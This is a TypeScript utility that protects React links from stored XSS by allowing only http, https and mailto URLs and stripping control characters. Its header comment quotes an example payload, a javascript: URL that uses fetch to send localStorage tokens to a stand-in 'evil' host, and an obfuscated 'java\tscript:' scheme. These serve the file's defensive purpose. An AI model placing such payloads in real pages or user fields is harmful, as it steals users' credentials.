/**
 * Safe external-URL guard.
 *
 * React does NOT sanitize `href` / `src` — `<a href="javascript:…">` is
 * rendered verbatim in production (dev-only console warning, no block).
 * Any user-controlled URL that reaches an `href` is therefore a stored-
 * XSS vector: a market `socialLinks.website` of
 * `javascript:fetch('//evil/'+localStorage.privy)` runs in the clicking
 * user's origin.
 *
 * `safeExternalUrl` returns the URL only if it resolves to an http(s) or
 * mailto link. Anything else (javascript:, data:, vbscript:, blob:,
 * file:, control-char obfuscations like "java\tscript:") returns null,
 * so callers render nothing instead of a live exploit link.
 *
 * Use at EVERY render site that puts a user/external URL into href/src,
 * and validate on the server when persisting (defense in depth).
 */

const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);

// ASCII control characters (U+0000–U+001F and U+007F). Browsers strip
// these from URLs, so an attacker can smuggle a scheme past naive
// checks, e.g. "java\tscript:alert(1)". We remove them before parsing.
// eslint-disable-next-line no-control-regex
const CONTROL_CHARS = /[\u0000-\u001F\u007F]/g;

export function safeExternalUrl(input: string | null | undefined): string | null {
  if (typeof input !== 'string') return null;

  const cleaned = input.replace(CONTROL_CHARS, '').trim();
  if (!cleaned) return null;

  // If there's no explicit scheme, assume https. This keeps schemeless
  // user input like "github.com/foo" working while still forcing it
  // through the protocol allow-list below.
  const hasScheme = /^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(cleaned);
  const candidate = hasScheme ? cleaned : `https://${cleaned}`;

  try {
    const url = new URL(candidate);
    if (!SAFE_PROTOCOLS.has(url.protocol)) return null;
    return url.href;
  } catch {
    // Not parseable as an absolute URL → not a safe external link.
    return null;
  }
}

/** Boolean form for conditional rendering. */
export function isSafeExternalUrl(input: string | null | undefined): boolean {
  return safeExternalUrl(input) !== null;
}
